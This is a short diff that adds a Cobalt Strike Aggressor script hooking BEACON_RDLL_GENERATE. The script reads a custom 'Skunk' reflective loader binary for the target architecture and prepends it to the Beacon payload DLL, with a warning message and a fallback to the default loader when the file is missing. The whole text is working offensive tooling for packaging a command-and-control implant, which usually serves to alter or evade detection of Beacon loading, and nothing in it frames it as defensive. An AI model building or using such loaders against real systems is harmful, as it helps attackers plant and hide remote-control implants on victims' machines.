@@ -1,0 +1,14 @@
+set BEACON_RDLL_GENERATE {
+	$hnd = openf(script_resource( "Skunk.". $3 .".bin"));
+	$Skunk = readb( $hnd, -1 );
+	closef( $hnd );
+
+	if ( strlen( $Skunk ) == 0 ) {
+		warn( 'Skunk not found... revert to default cobalt strike loader' );
+		return $null;
+	}
+
+	warn("Skunk Loader extracted length: " . strlen( $Skunk ));
+
+	return $Skunk . $2;
+};
